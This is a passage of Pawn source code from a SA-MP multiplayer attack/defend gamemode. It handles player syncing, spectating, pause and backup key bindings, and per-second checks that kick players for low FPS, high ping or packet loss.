			PlayerTextDrawSetString(playerid, RoundKillDmgTDmg, iString);

			foreach(new x : Player) {
			    OnPlayerStreamIn(playerid, x);
			    OnPlayerStreamIn(x, playerid);
			}

			SaveVariables[i][PauseWait] = false;

			StyleTextDrawFix(playerid);
			ResetSaveVariables(i);
	    	return 1;
		}
	}

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has spawned as: {FFFFFF}%s", Player[playerid][Name], TeamName[Player[playerid][Team]]);
	SendClientMessageToAll(-1, iString);

	return 1;
}

forward RespawnInVehicleAfterComeBack(playerid, vehicleid, seatid);
public RespawnInVehicleAfterComeBack(playerid, vehicleid, seatid)
{
    new ct = 0;
	foreach(new k : Player)
	{
		if(GetPlayerVehicleID(k) == vehicleid && GetPlayerVehicleSeat(k) == seatid)
	    	ct ++;
	}
    if(ct == 0)
    {
        PutPlayerInVehicle(playerid, vehicleid, seatid);
	}
	return 1;
}

stock ResetSaveVariables(i) {

    SaveVariables[i][pCoords][0] = 0.0;
	SaveVariables[i][pCoords][1] = 0.0;
	SaveVariables[i][pCoords][2] = 0.0;
	SaveVariables[i][pCoords][3] = 0.0;

	format(SaveVariables[i][pName], 24, "");

	SaveVariables[i][gHealth] = 0.0;
	SaveVariables[i][gArmour] = 0.0;
	SaveVariables[i][pInterior] = 0;
	SaveVariables[i][pVWorld] = 0;
    SaveVariables[i][pTeam] = 0;
    SaveVariables[i][RKills] = 0;
	SaveVariables[i][RDeaths] = 0;
    SaveVariables[i][RDamage] = 0;
    SaveVariables[i][TKills] = 0;
    SaveVariables[i][TDeaths] = 0;
    SaveVariables[i][TDamage] = 0;
    SaveVariables[i][RoundID] = -1;
    for(new j = 0; j < 55; j ++)
    	SaveVariables[i][WeaponStat][j] = 0;

    SaveVariables[i][WasCrashedInStart] = false;
    SaveVariables[i][ToBeAdded] = false;
    SaveVariables[i][CheckScore] = false;
    SaveVariables[i][PauseWait] = false;
    SaveVariables[i][pVehicleID] = -1;
    SaveVariables[i][pSeatID] = -1;
    SaveVariables[i][HadParachute] = 0;

}

stock ClearPlayerVariables()
{
	for(new i = 0; i < SAVE_SLOTS; i ++) {
		ResetSaveVariables(i);
	}
}

stock IsTeamTheSame(team1, team2)
{
	if(team1 == team2)
	    return true;
	else if((team1 == DEFENDER || team2 == DEFENDER) && (team1 == DEFENDER_SUB || team2 == DEFENDER_SUB))
		return true;
	else if((team1 == ATTACKER || team2 == ATTACKER) && (team1 == ATTACKER_SUB || team2 == ATTACKER_SUB))
		return true;
	else
	    return false;
}

stock SpecWeapons(playerid) {

    new WeaponString[256];
	new WeaponID2, Ammo2, weaponsfound;

	format(WeaponString, sizeof WeaponString, "   %sWeapons~n~~n~", MAIN_TEXT_COLOUR);
	for(new i = 0; i < 13; i++){
	    if(i == 0 || i == 1){
	   		GetPlayerWeaponData(playerid,i,WeaponID2,Ammo2);
	   		if(Ammo2 > 1){
			    Ammo2 = 1;
			}
	    } else {
	   		GetPlayerWeaponData(playerid,i,WeaponID2,Ammo2);
		}

		if(WeaponID2 > 0 && Ammo2 > 0) {
		    if(Ammo2 > 60000) {
		        Ammo2 = 1;
	        }

            weaponsfound++;
            if(weaponsfound <= 6) {
				format(WeaponString,sizeof(WeaponString),"%s%s%s ~r~~h~%d~n~", WeaponString, MAIN_TEXT_COLOUR, WeaponNames[WeaponID2], Ammo2);
			}
		}
	}

	if(!weaponsfound) {
		format(WeaponString, sizeof(WeaponString),"%s%sFist", WeaponString, MAIN_TEXT_COLOUR);
	}

	return WeaponString;

}

stock RemoveClanTagFromName(playerid) {
    new start, end, string[MAX_PLAYER_NAME];
    format(string, MAX_PLAYER_NAME, "%s", Player[playerid][Name]);
    start = strfind(string, "[", true);
    end = strfind(string, "]", true);
    if (start >= end){
		return string;
    }else{
        strdel(string, start, end + 1);
        return string;
    }
}

stock ColorFix(playerid) {
	if(Player[playerid][Playing] == true) {

	    switch(Player[playerid][Team]) {
	        case ATTACKER: SetPlayerColor(playerid, ATTACKER_PLAYING);
	        case DEFENDER: SetPlayerColor(playerid, DEFENDER_PLAYING);
	        case REFEREE: SetPlayerColor(playerid, REFEREE_COLOR);
		}

		new team = Player[playerid][Team];
		if(TeamHasLeader[team] == true && TeamLeader[team] == playerid)
		    PlayerLeadTeam(playerid, true, false);
	} else {
	    switch(Player[playerid][Team]) {
	        case ATTACKER: SetPlayerColor(playerid, ATTACKER_NOT_PLAYING);
	        case DEFENDER: SetPlayerColor(playerid, DEFENDER_NOT_PLAYING);
	        case REFEREE: SetPlayerColor(playerid, REFEREE_COLOR);
	        case ATTACKER_SUB: SetPlayerColor(playerid, ATTACKER_SUB_COLOR);
	        case DEFENDER_SUB: SetPlayerColor(playerid, DEFENDER_SUB_COLOR);
		}
	}
}

stock RadarFix()
{
    foreach(new i : Player)
	{
		foreach(new x : Player)
		{
		    if(Player[i][Playing] == true && Player[x][Playing] == true)
			{
		        if(Player[i][Team] != Player[x][Team])
				{
					SetPlayerMarkerForPlayer(x,i, GetPlayerColor(i) & 0xFFFFFF00);
	            }
				else
				{
					SetPlayerMarkerForPlayer(x, i, GetPlayerColor(i) | 0x00000055);
				}
			}
		 	else if(Player[i][Playing] == true && Player[x][Playing] == false)
			{
				if(Player[i][Team] != Player[x][Team])
				{
					SetPlayerMarkerForPlayer(x,i, GetPlayerColor(i) & 0xFFFFFF00);
	            }
				else
				{
					SetPlayerMarkerForPlayer(x, i, GetPlayerColor(i) | 0x00000055);
				}
			}
		}
    }
	switch(GameType)
	{
	    case BASE:
	    {
	        GangZoneShowForAll(CPZone, 0xFF000044);
	    }
	    case ARENA:
	    {
	        GangZoneShowForAll(ArenaZone,0x95000099);
	    }
	}
    return 1;
}

stock ClearChat() {
	for(new i = 0; i <= 10; i++) {
	    SendClientMessageToAll(-1, " ");
	}
}

stock ClearChatForPlayer(playerid) {
	for(new i = 0; i <= 10; i++) {
	    SendClientMessage(playerid, -1, " ");
	}
}

stock GetVehicleModelID(vehiclename[])
{
	for(new i = 0; i < 211; i++){
        if(strfind(aVehicleNames[i], vehiclename, true) != -1)
        return i + 400;
    } return -1;
}

stock ClearKillList() {
	for(new i = 0; i < 5; i++) {
	    SendDeathMessage(255, 50, 255);
	}
}

stock DestroyAllVehicles() {
	for(new i = 0; i < MAX_VEHICLES; i++)
	{
	    DestroyVehicle(i);
	}
	return 1;
}

SyncPlayer(playerid)
{
	if(RoundPaused == true && Player[playerid][Playing]) return 1;
	if(Player[playerid][Syncing] == true) return 1;
	if(AllowStartBase == false) return 1;
	if(IsPlayerInAnyVehicle(playerid)) return 1;
	if(Player[playerid][IsAFK] == true || Player[playerid][IsFrozen] == true) return 1;
	//if(Player[playerid][IsFreezed] == true) return 1;

	Player[playerid][Syncing] = true;
	SetTimerEx("SyncInProgress", 1000, false, "i", playerid);

	new bool:IsPlayerSpecing[MAX_PLAYERS] = false;
	foreach(new i : Player) {
	    if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid) {
	        IsPlayerSpecing[i] = true;
		}
	}

	new Float:HP[2], Float:Pos[4], Int, VirtualWorld, CurrWep;
	GetHP(playerid, HP[0]);
	GetAP(playerid, HP[1]);

	CurrWep = GetPlayerWeapon(playerid);

	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
	GetPlayerFacingAngle(playerid, Pos[3]);

	Int = GetPlayerInterior(playerid);
	VirtualWorld = GetPlayerVirtualWorld(playerid);

	new Weapons[13][2];
	for(new i = 0; i < 13; i++) {
	    GetPlayerWeaponData(playerid, i, Weapons[i][0], Weapons[i][1]);
	}

	ClearAnimations(playerid);

	SetSpawnInfoEx(playerid, GetPlayerTeam(playerid), Skin[Player[playerid][Team]], Pos[0], Pos[1], Pos[2]-0.4, Pos[3], 0, 0, 0, 0, 0, 0);

	Player[playerid][IgnoreSpawn] = true;
	SpawnPlayerEx(playerid);

	SetHP(playerid, HP[0]);
	SetAP(playerid, HP[1]);

	SetPlayerInterior(playerid, Int);
	SetPlayerVirtualWorld(playerid, VirtualWorld);

	for(new i = 0; i < 13; i++) {
	    GivePlayerWeapon(playerid, Weapons[i][0], Weapons[i][1]);
	}

	SetPlayerArmedWeapon(playerid, CurrWep);

	foreach(new i : Player) {
	    if(IsPlayerSpecing[i] == true) {
	        SetTimerEx("ReSpectatePlayer", 1000, false, "ii", i, playerid);
		}

//		OnPlayerStreamIn(playerid, i);
//		OnPlayerStreamIn(i, playerid);

	}

	return 1;
}



stock SpawnPlayerEx(playerid) {
	if(Player[playerid][Spawned] == true) {
	    StyleTextDrawFix(playerid);
		if(IsPlayerInAnyVehicle(playerid)) RemovePlayerFromVehicle(playerid);
		SetPlayerPos(playerid, 0, 0, 0);
	 	SpawnPlayer(playerid);
	}
	return 1;
}


stock IsNumeric(string[]){
    for (new i = 0, j = strlen(string); i < j; i++){
    	if (string[i] > '9' || string[i] < '0') return 0;
    }
    return 1;
}

/*
stock strmatch(const sStr1[], const sStr2[]) {
	return (strcmp(sStr1, sStr2, true) == 0) && (strlen(sStr2) == strlen(sStr1)) ? true : false;
}
*/

forward Float:GetPlayerPacketLoss(playerid);
public Float:GetPlayerPacketLoss(playerid) {

    /*new stats[401], stringstats[70];
    GetPlayerNetworkStats(playerid, stats, sizeof(stats));
    new len = strfind(stats, "Packetloss: ");
    new Float:packetloss = 0.0;
    if(len != -1) {
        strmid(stringstats, stats, len, strlen(stats));
        new len2 = strfind(stringstats, "%");
        if(len != -1) {
            strdel(stats, 0, strlen(stats));
            strmid(stats, stringstats, len2-3, len2);
            packetloss = floatstr(stats);
        }
    }*/

    return NetStats_PacketLossPercent(playerid);
}

stock GetPlayerFPS(playerid) {
	new drunk2 = GetPlayerDrunkLevel(playerid);
	if(drunk2 < 100){
	    SetPlayerDrunkLevel(playerid,2000);
	}else{
	    if(Player[playerid][DLlast] != drunk2){
	        new fps = Player[playerid][DLlast] - drunk2;
	        if((fps > 0) )// && (fps < 200))
   				Player[playerid][FPS] = fps;
			Player[playerid][DLlast] = drunk2;
		}
	}
	return Player[playerid][FPS];
}


/*
stock pProfile(playerid) {
	new String[128];
	format(String, sizeof(String), "attackdefend/users/%s.ini", Player[playerid][Name]);
	printf("pProfile: %s", String);
	return String;
}
*/

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	if(newkeys == 160 && (GetPlayerWeapon(playerid) == 0 || GetPlayerWeapon(playerid) == 1) && !IsPlayerInAnyVehicle(playerid)){
		SyncPlayer(playerid);
		return 1;
	}


	if(Player[playerid][TextDrawOnScreen] == true && PRESSED(4)) {
	    HideEndRoundTextDraw(playerid);
//	    ClearChatForPlayer(playerid);
		if(Player[playerid][InDM] == false && Player[playerid][Playing] == false) SetPlayerVirtualWorld(playerid, 0);
	}


	if(IsPlayerInAnyVehicle(playerid) && PRESSED(KEY_FIRE) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
 		AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
		return 1;
	}

	if(Player[playerid][SpectatingRound] != -1) {
	    new iString[256];
	    switch(Player[playerid][SpectatingType]) {
	        case BASE: {
	            if(newkeys == 4) {
				    new searching;
				    for(new i = Player[playerid][SpectatingRound]+1; i <= TotalBases+1; i++) {
						if(searching > 1) {
							break;
						}
				    	if(i == TotalBases+1) {
							i = 0;
				            searching++;
						}
						if(BExist[i] == true) {
						    Player[playerid][SpectatingRound] = i;
					        SetPlayerInterior(playerid, BInterior[i]);
							SetPlayerCameraLookAt(playerid,BCPSpawn[i][0],BCPSpawn[i][1],BCPSpawn[i][2]);
					   		SetPlayerCameraPos(playerid,BCPSpawn[i][0]+100,BCPSpawn[i][1],BCPSpawn[i][2]+80);
							SetPlayerPos(playerid, BCPSpawn[i][0], BCPSpawn[i][1], BCPSpawn[i][2]);
							format(iString, sizeof(iString), "%sBase ~n~%s%s (ID: ~r~~h~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, BName[i], i, MAIN_TEXT_COLOUR);
							PlayerTextDrawSetString(playerid, TD_RoundSpec, iString);
						 	break;
						}
					}
				} else if(newkeys == 128) {
				    new searching;
					for(new i = Player[playerid][SpectatingRound]-1; i >= 0; i--) {
						if(searching > 1) {
						    break;
						}
						if(i == 0) {
							i = TotalBases+1;
				            searching++;
						}

						if(BExist[i] == true) {
						    Player[playerid][SpectatingRound] = i;
					        SetPlayerInterior(playerid, BInterior[i]);
							SetPlayerCameraLookAt(playerid,BCPSpawn[i][0],BCPSpawn[i][1],BCPSpawn[i][2]);
					   		SetPlayerCameraPos(playerid,BCPSpawn[i][0]+100,BCPSpawn[i][1],BCPSpawn[i][2]+80);
							SetPlayerPos(playerid, BCPSpawn[i][0], BCPSpawn[i][1], BCPSpawn[i][2]);

							format(iString, sizeof(iString), "%sBase ~n~%s%s (ID: ~r~~h~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, BName[i], i, MAIN_TEXT_COLOUR);
							PlayerTextDrawSetString(playerid, TD_RoundSpec, iString);
						 	break;
						}
					}
				}
	        } case ARENA,TDM: {
	            if(newkeys == 4) {
				    new searching;
				    for(new i = Player[playerid][SpectatingRound]+1; i <= TotalArenas+1; i++) {
						if(searching > 1) {
							break;
						}
				    	if(i == TotalArenas+1) {
							i = 0;
				            searching++;
						}
						if(AExist[i] == true) {
						    Player[playerid][SpectatingRound] = i;
							SetPlayerCameraLookAt(playerid,ACPSpawn[Player[playerid][SpectatingRound]][0],ACPSpawn[Player[playerid][SpectatingRound]][1],ACPSpawn[Player[playerid][SpectatingRound]][2]);
					   		SetPlayerCameraPos(playerid,ACPSpawn[Player[playerid][SpectatingRound]][0]+100,ACPSpawn[Player[playerid][SpectatingRound]][1],ACPSpawn[Player[playerid][SpectatingRound]][2]+80);
							SetPlayerPos(playerid, ACPSpawn[Player[playerid][SpectatingRound]][0], ACPSpawn[Player[playerid][SpectatingRound]][1], ACPSpawn[Player[playerid][SpectatingRound]][2]);
							SetPlayerInterior(playerid, AInterior[Player[playerid][SpectatingRound]]);

							if( GameType == ARENA ) format(iString, sizeof(iString), "%sArena ~n~%s%s (ID: ~r~~h~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, AName[Player[playerid][SpectatingRound]], Player[playerid][SpectatingRound], MAIN_TEXT_COLOUR);
							else if( GameType == TDM ) format(iString, sizeof(iString), "%sTDM ~n~%s%s (ID: ~r~~h~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, AName[Player[playerid][SpectatingRound]], Player[playerid][SpectatingRound], MAIN_TEXT_COLOUR);
							PlayerTextDrawSetString(playerid, TD_RoundSpec, iString);
						 	break;
						}
					}
				} else if(newkeys == 128) {
				    new searching;
					for(new i = Player[playerid][SpectatingRound]-1; i >= 0; i--) {
						if(searching > 1) {
						    break;
						}
						if(i == 0) {
							i = TotalArenas+1;
				            searching++;
						}

						if(AExist[i] == true) {
						    Player[playerid][SpectatingRound] = i;
							SetPlayerCameraLookAt(playerid,ACPSpawn[Player[playerid][SpectatingRound]][0],ACPSpawn[Player[playerid][SpectatingRound]][1],ACPSpawn[Player[playerid][SpectatingRound]][2]);
					   		SetPlayerCameraPos(playerid,ACPSpawn[Player[playerid][SpectatingRound]][0]+100,ACPSpawn[Player[playerid][SpectatingRound]][1],ACPSpawn[Player[playerid][SpectatingRound]][2]+80);
							SetPlayerPos(playerid, ACPSpawn[Player[playerid][SpectatingRound]][0], ACPSpawn[Player[playerid][SpectatingRound]][1], ACPSpawn[Player[playerid][SpectatingRound]][2]);
							SetPlayerInterior(playerid, AInterior[Player[playerid][SpectatingRound]]);

							format(iString, sizeof(iString), "%sArena ~n~%s%s (ID: ~r~~h~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, AName[Player[playerid][SpectatingRound]], Player[playerid][SpectatingRound], MAIN_TEXT_COLOUR);
							PlayerTextDrawSetString(playerid, TD_RoundSpec, iString);
						 	break;
						}
					}
				}

			}
		}
		if(newkeys == 32) {
		    switch(Player[playerid][SpectatingType]) {
				case BASE: format(iString, sizeof(iString), ""COL_PRIM"Spectating Base: {FFFFFF}%s (ID: %d)", BName[Player[playerid][SpectatingRound]], Player[playerid][SpectatingRound]);
				case ARENA: format(iString, sizeof(iString), ""COL_PRIM"Spectating Arena: {FFFFFF}%s (ID: %d)", AName[Player[playerid][SpectatingRound]], Player[playerid][SpectatingRound]);
			}
		    SendClientMessage(playerid, -1, iString);
			SetCameraBehindPlayer(playerid);
		    Player[playerid][SpectatingRound] = -1;
		    PlayerTextDrawSetString(playerid, TD_RoundSpec, "_");
		    Player[playerid][Spectating] = false;
		}

		return 1;
	}




	if(Player[playerid][Spectating] == true && noclipdata[playerid][FlyMode] == false) {
		if(newkeys == 4) {
            Player[playerid][CalledByPlayer] = true;

			if(Current != -1 && (Player[playerid][Team] == ATTACKER || Player[playerid][Team] == ATTACKER_SUB || Player[playerid][Team] == DEFENDER || Player[playerid][Team] == DEFENDER_SUB)) {
				SpectateNextTeamPlayer(playerid);
			} else {
			    SpectateNextPlayer(playerid);
			}
		} else if(newkeys == 128) {
            Player[playerid][CalledByPlayer] = true;

			if(Current != -1 && (Player[playerid][Team] == ATTACKER || Player[playerid][Team] == ATTACKER_SUB || Player[playerid][Team] == DEFENDER || Player[playerid][Team] == DEFENDER_SUB)) {
				SpectatePreviousTeamPlayer(playerid);
			} else {
			    SpectatePreviousPlayer(playerid);
			}
		}
	}

	if(Current == -1) {
		if(PRESSED(KEY_YES) && Player[playerid][Level] > 1) {
			EnableInterface(playerid);
			return 1;

		}
		else if(PRESSED(131072)) {
		    ShowEndRoundTextDraw(playerid);
		    return 1;
		}
	}


	if(Current != -1 && Player[playerid][Playing] == true)
	{
		if(Player[playerid][Level] > 0)
	    {
			if(PRESSED(65536))
			{
		    	new iString[160];
				if(RoundPaused == false)
				{
				    if(RoundUnpausing == true) return SendErrorMessage(playerid,"Round is unpausing, please wait.");

					PausePressed = true;
					SetTimer("PausedIsPressed", 4000, false);

				    PauseRound();

					format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has paused the current round.", Player[playerid][Name]);
					SendClientMessageToAll(-1, iString);
					return 1;
				}
				else
				{
					if(PausePressed == true) return SendErrorMessage(playerid,"Please Wait.");
					if(RoundUnpausing == true) return 1;

					PauseCountdown = 4;
				    UnpauseRound();

					format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has unpaused the current round.", Player[playerid][Name]);
					SendClientMessageToAll(-1, iString);
					return 1;
				}
			}
		}
		else
		{
            if(PRESSED(65536) && RoundPaused == false)
            {
			    if((GetTickCount() - Player[playerid][lastChat]) < 10000)
				{
					SendErrorMessage(playerid,"Please wait.");
					return 0;
				}
				foreach(new i : Player)
				    PlayerPlaySound(i, 1133, 0.0, 0.0, 0.0);
				Player[playerid][lastChat] = GetTickCount();
				SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"is asking for a pause!", Player[playerid][Name]));
			}
			if(PRESSED(65536) && RoundPaused == true)
            {
			    if((GetTickCount() - Player[playerid][lastChat]) < 10000)
				{
					SendErrorMessage(playerid,"Please wait.");
					return 0;
				}
				foreach(new i : Player)
				    PlayerPlaySound(i, 1133, 0.0, 0.0, 0.0);
				Player[playerid][lastChat] = GetTickCount();
				SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"is asking for an unpause!", Player[playerid][Name]));
			}
		}

        if(PRESSED(262144) && AllowStartBase == true && Player[playerid][Playing] == true)
        {
            if(IsPlayerInAnyVehicle(playerid))
                return 1;

            if((GetTickCount() - Player[playerid][LastAskLeader]) < 10000)
			{
				SendErrorMessage(playerid,"Please wait.");
				return 0;
			}
            new team = Player[playerid][Team];
			if(TeamHasLeader[team] != true)
            {
                PlayerLeadTeam(playerid, false, true);
           	}
           	else
           	{
           	    if(TeamLeader[team] == playerid) // off
      	    	{
                    PlayerNoLeadTeam(playerid);
           	    }
           	    else
           	    	SendErrorMessage(playerid, "Your team already has a leader!");
           	}
           	Player[playerid][LastAskLeader] = GetTickCount();
        }

		if(PRESSED(131072) && AllowStartBase == true && Player[playerid][Playing] == true)
		{
		    if(Player[playerid][Team] == ATTACKER && TeamHelp[ATTACKER] == false) {
                new iString[160];
				foreach(new i : Player) {
				    if((Player[i][Playing] == true || GetPlayerState(i) == PLAYER_STATE_SPECTATING) && i != playerid && Player[i][Team] == ATTACKER) {
						format(iString, sizeof(iString), "{BEFFBB}[HELP] {FFFFFF}%s {BEFFBB}has requested for backup! .:Distance %.0f feet:.", Player[playerid][Name], GetDistanceBetweenPlayers(i, playerid));
					    SendClientMessage(i, -1, iString);
					    PlayerPlaySound(i,1137,0.0,0.0,0.0);
					}
				}
				TeamHelp[ATTACKER] = true;
				Player[playerid][AskingForHelp] = true;
				SetPlayerColor(playerid, ATTACKER_ASKING_HELP);

				SendClientMessage(playerid, -1, "{BEFFBB}[HELP] {FFFFFF}You have requested for backup.");
				Player[playerid][AskingForHelpTimer] = SetTimerEx("AttackerAskingHelp", 7000, 0, "i", playerid);

			} else if(Player[playerid][Team] == DEFENDER && TeamHelp[DEFENDER] == false) {
                new iString[160];
				foreach(new i : Player) {
				    if((Player[i][Playing] == true || GetPlayerState(i) == PLAYER_STATE_SPECTATING) && i != playerid && Player[i][Team] == DEFENDER) {
				    	format(iString, sizeof(iString), "{BEFFBB}[HELP] {FFFFFF}%s {BEFFBB}has requested for backup! .:Distance %.0f feet:.", Player[playerid][Name], GetDistanceBetweenPlayers(i, playerid));
					    SendClientMessage(i, -1, iString);
					    PlayerPlaySound(i,1137,0.0,0.0,0.0);
					}
				}
				TeamHelp[DEFENDER] = true;
				Player[playerid][AskingForHelp] = true;
				SetPlayerColor(playerid, DEFENDER_ASKING_HELP);

				SendClientMessage(playerid, -1, "{BEFFBB}[HELP] {FFFFFF}You have requested for backup.");
				Player[playerid][AskingForHelpTimer] = SetTimerEx("DefenderAskingHelp", 7000, 0, "i", playerid);

			}

			RadarFix();
		}
	}
	if(PRESSED(KEY_ANALOG_DOWN))
	{
	    if(ShortCuts == true) {
		    if(GetTickCount() < Player[playerid][lastChat]) {
				SendErrorMessage(playerid,"Please wait.");
				return 0;
			}
			Player[playerid][lastChat] = GetTickCount() + 5000;
		    OnPlayerText(playerid, sprintf("! [Shortcut]: %s", PlayerShortcut[playerid][Shortcut1]));
		} else return 0;
	}
	if(PRESSED(KEY_ANALOG_LEFT))
	{
	    if(ShortCuts == true) {
		    if(GetTickCount() < Player[playerid][lastChat]) {
				SendErrorMessage(playerid,"Please wait.");
				return 0;
			}
			Player[playerid][lastChat] = GetTickCount() + 5000;
		    OnPlayerText(playerid, sprintf("! [Shortcut]: %s", PlayerShortcut[playerid][Shortcut2]));
		} else return 0;
	}
	if(PRESSED(KEY_ANALOG_RIGHT))
	{
	    if(ShortCuts == true) {
		    if(GetTickCount() < Player[playerid][lastChat]) {
				SendErrorMessage(playerid,"Please wait.");
				return 0;
			}
			Player[playerid][lastChat] = GetTickCount() + 5000;
		    OnPlayerText(playerid, sprintf("! [Shortcut]: %s", PlayerShortcut[playerid][Shortcut3]));
		} else return 0;
	}
	if(PRESSED(KEY_ANALOG_UP))
	{
	    if(ShortCuts == true) {
		    if(GetTickCount() < Player[playerid][lastChat]) {
				SendErrorMessage(playerid,"Please wait.");
				return 0;
			}
			Player[playerid][lastChat] = GetTickCount() + 5000;
		    OnPlayerText(playerid, sprintf("! [Shortcut]: %s", PlayerShortcut[playerid][Shortcut4]));
		} else return 0;
	}
	return 1;
}




//------------------------------------------------------------------------------
// Script update per second And Forward Scripts
//------------------------------------------------------------------------------
// When a function is called from a timer you always have to 'forward' first and then 'public'


forward OnScriptUpdate();
public OnScriptUpdate()
{

	TeamHP[ATTACKER] = 0;
	TeamHP[DEFENDER] = 0;
	PlayersAlive[ATTACKER] = 0;
	PlayersAlive[DEFENDER] = 0;

    foreach(new i : Player)
	{
	    // Target info
		if(ToggleTargetInfo == true && Player[i][Spectating] != true)
		{
			ShowTargetInfo(i, GetPlayerTargetPlayer(i));
		}
		
		new ammo;
		GetPlayerWeaponData(i, 0, ammo, ammo);
		if(ammo == 1000) { // aimbot detector
		    AddAimbotBan(i);
		}

		Player[i][PauseCount] ++; // AFK variable
		
        if(PlayersInCP > 0 && Current != -1 && RoundPaused == false)
			PlayerPlaySound(i,1056,0.0,0.0,0.0); // Plays sound that CP is being taken

		if(RoundPaused == false)
		{
		    GetPlayerFPS(i);
            PlayerTextDrawSetString(i, FPSPingPacket, sprintf("%sFPS ~r~%d			%sPing ~r~%d			%sPacketLoss ~r~%.1f%%", MAIN_TEXT_COLOUR, Player[i][FPS], MAIN_TEXT_COLOUR, GetPlayerPing(i), MAIN_TEXT_COLOUR, GetPlayerPacketLoss(i)));
		}
		
		if(Player[i][Spectating] == true && Player[i][IsSpectatingID] != INVALID_PLAYER_ID && !noclipdata[i][FlyMode])
		{
		    new specStr[256];
			new specid = Player[i][IsSpectatingID];
			format(specStr, sizeof(specStr),"%s%s ~r~~h~%d~n~~n~%s(%.0f) (~r~~h~%.0f%s)~n~FPS: ~r~~h~%d %sPing: ~r~~h~%d~n~%sPacket-Loss: ~r~~h~%.1f~n~%sKills: ~r~~h~%d~n~%sDamage: ~r~~h~%.0f~n~%sTotal Dmg: ~r~~h~%.0f",
				MAIN_TEXT_COLOUR, Player[specid][Name], specid, MAIN_TEXT_COLOUR, Player[specid][pArmour], Player[specid][pHealth], MAIN_TEXT_COLOUR, GetPlayerFPS(specid), MAIN_TEXT_COLOUR, GetPlayerPing(specid), MAIN_TEXT_COLOUR, GetPlayerPacketLoss(specid), MAIN_TEXT_COLOUR, Player[specid][RoundKills], MAIN_TEXT_COLOUR, Player[specid][RoundDamage], MAIN_TEXT_COLOUR, Player[specid][TotalDamage]);
			PlayerTextDrawSetString(i, SpecText[1], specStr);
			PlayerTextDrawSetString(i, SpecText[3], SpecWeapons(specid));

		}

		if(GetPlayerVehicleID(i) == 0) {
			Update3DTextLabelText(PingFPS[i], 0x00FF00FF, "");
		}
		else
		{
			GetPlayerFPS(i);
			Update3DTextLabelText(PingFPS[i], 0x00FF00FF, sprintf("%sPL: {FFFFFF}%.1f%%\n%sPing: {FFFFFF}%i\n%sFPS: {FFFFFF}%i", TextColor[Player[i][Team]], GetPlayerPacketLoss(i), TextColor[Player[i][Team]], GetPlayerPing(i), TextColor[Player[i][Team]], Player[i][FPS]));
		}

		if(Player[i][InDuel] == true && Player[i][NetCheck] == 1)
		{
		    GetPlayerFPS(i);
			if(Player[i][FPS] < Min_FPS && Player[i][FPS] != 0 && Player[i][PauseCount] < 5  && Player[i][FPSCheck] == 1) {
			    Player[i][FPSKick]++;
			    SendClientMessage(i, -1, sprintf("{CCCCCC}Low FPS! Warning %d/7", Player[i][FPSKick]));

				if (Player[i][FPSKick] == 7) {
			        SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has been kicked from the server .: {FFFFFF}Low FPS | %d/%d "COL_PRIM":.", Player[i][Name], Player[i][FPS], Min_FPS));
					SetTimerEx("OnPlayerKicked", 500, false, "i", i);

			    } else if (Player[i][FPSKick] > 7) {
			        Player[i][FPSKick] = 0;
				}

			} else  {
			    Player[i][FPSKick] = 0;
			}


			if(GetPlayerPacketLoss(i) >= Max_Packetloss && Player[i][FakePacketRenovation] == false && Player[i][PLCheck] == 1){
			    Player[i][PacketKick]++;
			    SendClientMessage(i, -1, sprintf("{CCCCCC}High PL! Warning %d/15", Player[i][PacketKick]));

			    if(Player[i][PacketKick] == 15) {
			        SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has been kicked from the server .: {FFFFFF}High PacketLoss | %.2f/%.2f "COL_PRIM":.", Player[i][Name], GetPlayerPacketLoss(i), Max_Packetloss));
					SetTimerEx("OnPlayerKicked", 500, false, "i", i);

			    } else if(Player[i][PacketKick] > 15) {
			        Player[i][PacketKick] = 0;
				}
			} else  {
			    Player[i][PacketKick] = 0;
			}

			if(GetPlayerPing(i) >= Max_Ping && Player[i][PingCheck] == 1){
			    Player[i][PingKick]++;
			    SendClientMessage(i, -1, sprintf("{CCCCCC}High Ping! Warning %d/10", Player[i][PingKick]));

			    if(Player[i][PingKick] == 10) {
			        SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has been kicked from the server .: {FFFFFF}High Ping | %d/%d "COL_PRIM":.", Player[i][Name], GetPlayerPing(i), Max_Ping));
					SetTimerEx("OnPlayerKicked", 500, false, "i", i);

			    } else if(Player[i][PingKick] > 10) {
			        Player[i][PingKick] = 0;
				}
			} else {
			    Player[i][PingKick] = 0;
			}
		}

		if(Player[i][Playing] == true)
		{
   			if(GameType == ARENA || GameType == TDM)
			{
			    if(IsPlayerInArea(i,AMin[Current][0], AMax[Current][0], AMin[Current][1], AMax[Current][1]) != 1 && Player[i][PauseCount] < 2)
				{

					if(RoundPaused == false)
						Player[i][OutOfArena]--;
						
				    PlayerTextDrawSetString(i, AreaCheckTD, sprintf("%sStay in Arena. (~r~%d%s)", MAIN_TEXT_COLOUR, Player[i][OutOfArena], MAIN_TEXT_COLOUR));

					PlayerTextDrawShow(i, AreaCheckTD);
				    PlayerTextDrawShow(i, AreaCheckBG);

					if(Player[i][OutOfArena] <= 0) {
	                    RemovePlayerFromRound(i);
						new Float: hp, Float: arm;
						GetHP( i, hp );
						GetAP( i, arm );
					    SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has been removed for not staying in Arena. {FFFFFF}.: (%0.1f | %0.1f) :.", Player[i][Name], hp, arm));

						Player[i][OutOfArena] = 5;

		    			PlayerTextDrawHide(i, AreaCheckTD);
				    	PlayerTextDrawHide(i, AreaCheckBG);
